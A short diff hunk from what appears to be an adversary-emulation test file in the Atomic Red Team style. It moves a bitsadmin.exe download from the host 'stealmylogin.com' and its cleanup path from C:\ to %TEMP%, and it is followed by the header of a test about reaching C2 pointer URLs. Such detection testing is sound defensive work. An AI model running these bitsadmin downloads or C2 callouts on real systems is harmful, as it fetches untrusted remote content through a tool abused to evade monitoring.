@@ -14,9 +14,9 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ C:\bitsadmindownload.html
+      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
     cleanup_command: |
-      del C:\bitsadmindownload.html
+      del %TEMP%\bitsadmindownload.html
 
 
 - name: Reach out to C2 Pointer URLs via powershell
